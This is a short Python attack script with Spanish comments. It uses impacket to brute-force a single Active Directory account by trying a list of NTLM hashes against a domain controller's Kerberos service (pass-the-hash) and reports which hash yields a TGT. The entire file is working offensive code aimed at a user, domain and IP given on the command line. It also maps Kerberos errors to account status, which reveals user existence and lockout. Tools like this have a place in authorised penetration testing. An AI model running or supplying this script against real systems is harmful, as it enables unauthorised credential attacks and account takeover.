#!/usr/bin/python3
from binascii import unhexlify
import socket
import argparse
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.asn1 import AS_REP
from impacket.krb5.kerberosv5 import KerberosError
from pyasn1.codec.der import decoder

def login(username, domain, dc_ip, password='', nthash='', aesKey=None):
    lmhash = 'aad3b435b51404eeaad3b435b51404ee'
    # 1. Validación de Principal
    try:
        kerb_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    except Exception as e:
        print(f"[-] Error en formato de principal: {e}")
        return "principal-error"

    # 2. Procesamiento de Hashes
    try:
        lm = unhexlify(lmhash) if lmhash else None
        nt = unhexlify(nthash) if nthash else None
    except (TypeError, ValueError) as e:
        print(f"[-] Error: Formato de hash LM/NT no es hexadecimal válido")
        return "invalid-hash"

    try:
        getKerberosTGT(kerb_principal, password, domain, lm, nt, aesKey, dc_ip)
        print(f"[+] Success {domain}/{username}:{nthash}")
        return True
    except KerberosError as e:
        code = e.getErrorCode()

        error_messages = {
            constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value: "Usuario no encontrado",
            constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value: "Cuenta deshabilitada, bloqueada o expirada",
            constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value: "Pre-autenticación fallida (Hash/Password incorrecto)",
            #constants.ErrorCodes.KDC_ERR_S_SKEW_NOT_IN_WINDOW.value: "Clock Skew > 5 mins (Sincroniza el reloj)",
            constants.ErrorCodes.KDC_ERR_WRONG_REALM.value: "Reino (Realm) o Dominio incorrecto",
            constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value: "Cifrado no soportado (Posible falta de AES256)",
        }

        msg = error_messages.get(code, f"Error Kerberos no mapeado ({e.getErrorString()})")
        print(f"[-] [{code}] {msg} -> {username}")
        return f"krb-error-{code}"
    except socket.timeout:
        print(f"[-] Timeout: El DC en {dc_ip} no responde (¿VPN activa?)")
    except (ConnectionRefusedError, socket.error) as e:
        print(f"[-] Error de conexión con el DC {dc_ip}: {e}")
    except Exception as e:
        print(f"[-] Error inesperado ({type(e).__name__}): {e}")

    return False

def brute_force(user, domain, ip, list_ntlm):
    try:
        with open(list_ntlm, 'r') as f:
            nthash = f.readlines()
            for ntlm in nthash:
                login(user, domain, ip, '', ntlm.strip('\r\n'))
    except FileNotFoundError:
        print("Archivo no encontrado")
    except PermissionError:
        print("No tienes permisos para leer este archivo")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="dominio objetivo", required=True)
    parser.add_argument("-i", "--ip", help="ip objetivo", required=True)
    parser.add_argument("-u", "--user", help="usuario a atacar", required=True)
    parser.add_argument("-ntlm", "--list_ntlm", help="listado de credenciales NTLM", required=True)

    args = parser.parse_args()
    brute_force(args.user, args.domain, args.ip, args.list_ntlm)
